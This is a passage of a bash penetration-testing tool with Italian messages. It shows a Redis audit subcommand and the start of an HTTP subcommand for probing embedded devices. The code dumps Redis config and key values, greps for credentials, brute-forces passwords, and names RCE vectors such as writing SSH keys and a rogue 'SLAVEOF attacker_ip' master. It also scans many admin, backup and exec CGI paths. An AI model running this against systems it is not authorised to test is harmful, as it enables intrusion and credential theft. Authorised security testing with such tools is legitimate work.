usage_redis() {
    echo "Uso: exa-dune redis <TARGET> [OPTIONS]"
    echo ""
    echo "  Redis audit — unauthenticated access, config dump, RCE via cron/SSH"
    echo "  Wraps: redis-cli, nmap, nc"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta Redis (default: 6379)"
    echo "  --passlist FILE    Lista password da provare"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_redis() {
    local target="" port=6379 passlist=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)     _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --passlist) _req_arg "$1" "${2:-}"; passlist="$2";    shift 2 ;;
            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)  DRY_RUN=1;        shift ;;
            --help|-h)  usage_redis; exit 0 ;;
            -*)         err "Opzione sconosciuta: $1"; usage_redis; exit 1 ;;
            *)          target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_redis; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "redis"
    log "Target: $target:$port | Output: $OUTDIR"

    section "Nmap Redis Scan"
    run_cmd "nmap_redis" \
        "nmap -p $port --script redis-info \
         -oN \"$OUTDIR\"/nmap_redis.txt $target 2>&1"

    section "Redis Unauthenticated Access"
    if [[ $DRY_RUN -eq 0 ]]; then
        check_port "$target" "$port" || { warn "Porta $port chiusa — Redis non raggiungibile"; ok "Redis audit completato → $OUTDIR"; return; }
        local redis_info
        if tool_ok redis-cli; then
            redis_info=$(redis-cli -h "$target" -p "$port" INFO server 2>&1 | head -20 || true)
        else
            redis_info=$(printf '*1\r\n$4\r\nINFO\r\n' | nc -w 3 "$target" "$port" 2>/dev/null | head -20 || true)
        fi
        if [[ -n "$redis_info" ]] && echo "$redis_info" | grep -qiE "redis_version|os:|arch_bits:"; then
            found CRITICAL "Redis:$port — accesso SENZA AUTENTICAZIONE"
            echo "$redis_info" > "$OUTDIR/redis_info.txt"
            local redis_ver; redis_ver=$(echo "$redis_info" | grep "redis_version" | cut -d: -f2 | tr -d ' \r' || true)
            log "Redis version: $redis_ver"

            section "Redis Config Dump"
            if tool_ok redis-cli; then
                redis-cli -h "$target" -p "$port" CONFIG GET '*' 2>/dev/null \
                    | tee "$OUTDIR/redis_config.txt"
                # Ricerca credenziali in config
                grep -iE "pass|requirepass|masterauth|tls" "$OUTDIR/redis_config.txt" 2>/dev/null | \
                    while IFS= read -r line; do found HIGH "Redis config — $line"; done || true
                redis-cli -h "$target" -p "$port" CLIENT LIST 2>/dev/null \
                    | tee "$OUTDIR/redis_clients.txt"
                redis-cli -h "$target" -p "$port" DBSIZE 2>/dev/null \
                    | tee "$OUTDIR/redis_dbsize.txt"
                # Scan chiavi (non modificativo)
                redis-cli -h "$target" -p "$port" SCAN 0 COUNT 50 2>/dev/null \
                    | tee "$OUTDIR/redis_keys.txt"
                # Leggi prime chiavi trovate
                local keys; keys=$(grep -v "^0$\|^[0-9]\+$" "$OUTDIR/redis_keys.txt" 2>/dev/null | head -10 || true)
                for key in $keys; do
                    redis-cli -h "$target" -p "$port" GET "$key" 2>/dev/null | head -1 \
                        | tee -a "$OUTDIR/redis_key_values.txt"
                done
            fi

            section "Redis RCE via CONFIG SET dir (SSH authorized_keys)"
            # Tecnica classica: scrivi la chiave SSH pubblica in authorized_keys via Redis CONFIG SET
            if tool_ok redis-cli; then
                local redis_dir
                redis_dir=$(redis-cli -h "$target" -p "$port" CONFIG GET dir 2>/dev/null \
                    | tail -1 | tr -d ' \r' || true)
                local redis_dbfile
                redis_dbfile=$(redis-cli -h "$target" -p "$port" CONFIG GET dbfilename 2>/dev/null \
                    | tail -1 | tr -d ' \r' || true)
                log "Redis dir: ${redis_dir:-unknown} | dbfile: ${redis_dbfile:-unknown}"
                echo "Redis dir: $redis_dir | dbfile: $redis_dbfile" >> "$OUTDIR/redis_rce_info.txt"
                # Verifica se la dir è una directory sensibile
                if echo "$redis_dir" | grep -qE "^/root|^/home|^/etc"; then
                    found CRITICAL "Redis:$port — dir sensibile: $redis_dir — RCE via CONFIG SET applicabile"
                    echo "RCE vector: CONFIG SET dir $redis_dir + SET key ssh_key + BGSAVE" >> "$OUTDIR/redis_rce_info.txt"
                fi
            fi

            section "Redis RCE via SLAVEOF / REPLICAOF (malicious master)"
            found HIGH "Redis:$port — SLAVEOF/REPLICAOF disponibile: RCE tramite modulo Redis caricabile da master malevolo"
            echo "RCE vector: SLAVEOF attacker_ip port (load malicious module)" >> "$OUTDIR/redis_rce_info.txt"
        else
            log "Redis richiede autenticazione o non risponde"
            # Prova password comuni
            section "Redis Password Brute Force"
            local pl_file="${passlist:-$(_wl_pass)}"
            if tool_ok redis-cli && [[ -f "$pl_file" ]]; then
                while IFS= read -r pass; do
                    [[ -z "$pass" ]] && continue
                    local auth_resp
                    auth_resp=$(redis-cli -h "$target" -p "$port" AUTH "$pass" 2>&1 | head -1 || true)
                    if echo "$auth_resp" | grep -qi "^OK"; then
                        found CRITICAL "Redis:$port — password trovata: '$pass'"
                        echo "$pass" >> "$OUTDIR/redis_password.txt"
                        break
                    fi
                done < "$pl_file"
            fi
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Redis audit: INFO + CONFIG GET + key scan + RCE check su $target:$port"
    fi

    ok "Redis audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: http
# ============================================================
usage_http() {
    echo "Uso: exa-dune http <TARGET> [OPTIONS]"
    echo ""
    echo "  HTTP exploitation dedicato per device embedded (CGI, auth bypass, injection)"
    echo "  Wraps: curl, nc"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT         Porta HTTP/HTTPS (default: 80)"
    echo "  --scheme http|https (default: http)"
    echo "  --paths FILE        File con path aggiuntivi da testare"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_http() {
    local target="" port=80 scheme="http" paths_file=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
            --paths)   _req_arg "$1" "${2:-}"; paths_file="$2";  shift 2 ;;
            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run) DRY_RUN=1;        shift ;;
            --help|-h) usage_http; exit 0 ;;
            -*)        err "Opzione sconosciuta: $1"; usage_http; exit 1 ;;
            *)         target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_http; exit 1; }
    validate_target "$target"
    validate_port "$port"
    setup_outdir "$target" "http_${port}"
    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
    local base_url="${scheme}://${target}:${port}"
    log "Target: $base_url | Output: $OUTDIR"

    section "Embedded Device CGI Paths (admin, config, backup)"
    local cgi_paths=(
        # Admin/login
        "/cgi-bin/admin.cgi" "/cgi-bin/login.cgi" "/cgi-bin/main.cgi"
        "/admin/" "/admin/index.html" "/admin.html" "/administration/"
        "/manager/" "/manage/" "/management/" "/setup/" "/config/"
        # VoIP/SIP gateway
        "/cgi-bin/webadmin.cgi" "/cgi-bin/voip.cgi" "/cgi-bin/sip.cgi"
        "/cgi-bin/gateway.cgi" "/cgi-bin/pbx.cgi"
        "/cgi-bin/network.cgi" "/cgi-bin/system.cgi"
        # IP Camera
        "/cgi-bin/snapshot.cgi" "/cgi-bin/video.cgi" "/cgi-bin/stream.cgi"
        "/stream" "/snapshot.jpg" "/mjpeg" "/video.cgi"
        "/cgi-bin/hi3510/param.cgi" "/cgi-bin/hi3510/snap.cgi"
        # Config/backup dump
        "/config.bin" "/config.cfg" "/config.xml" "/config.tar.gz"
        "/backup.bin" "/backup.cfg" "/backup/" "/getconfig"
        "/cgi-bin/config.cgi" "/cgi-bin/backup.cgi" "/cgi-bin/export.cgi"
        # Firmware update endpoint
        "/cgi-bin/upgrade.cgi" "/firmware.bin" "/update" "/upgrade"
        "/cgi-bin/firmware.cgi" "/flash" "/flashimage"
        # Info/status
        "/cgi-bin/info.cgi" "/status" "/status.xml" "/info.xml"
        "/cgi-bin/status.cgi" "/system_info" "/devinfo"
        # Diagnostic
        "/cgi-bin/ping.cgi" "/cgi-bin/traceroute.cgi" "/cgi-bin/exec.cgi"
        "/cgi-bin/cmd.cgi" "/cgi-bin/run.cgi" "/cgi-bin/debug.cgi"
        # Common embedded HTTP
        "/index.cgi" "/home.cgi" "/main.cgi" "/default.cgi"
        "/cgi-bin/index.cgi" "/cgi-bin/home.cgi"
        # OpenRG / AudioCodes paths
        "/setup.html" "/advanced.html" "/wizard.html"
        # Samba web admin
        "/swat/" "/cgi-bin/swat.cgi"
    )
    [[ -f "$paths_file" ]] && mapfile -t extra_paths < "$paths_file" && \
        cgi_paths+=("${extra_paths[@]}")

    if [[ $DRY_RUN -eq 0 ]]; then
        for cpath in "${cgi_paths[@]}"; do
            local code
            code=$(curl -sk $insecure --max-time 5 -o /dev/null \
                -w "%{http_code}" "${base_url}${cpath}" 2>/dev/null || true)
            if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" || "$code" == "403" ]]; then
                echo "  [HTTP $code] ${base_url}${cpath}" | tee -a "$OUTDIR/http_paths.txt"
                [[ "$code" == "200" ]] && found MEDIUM "HTTP CGI — $cpath risponde HTTP $code"
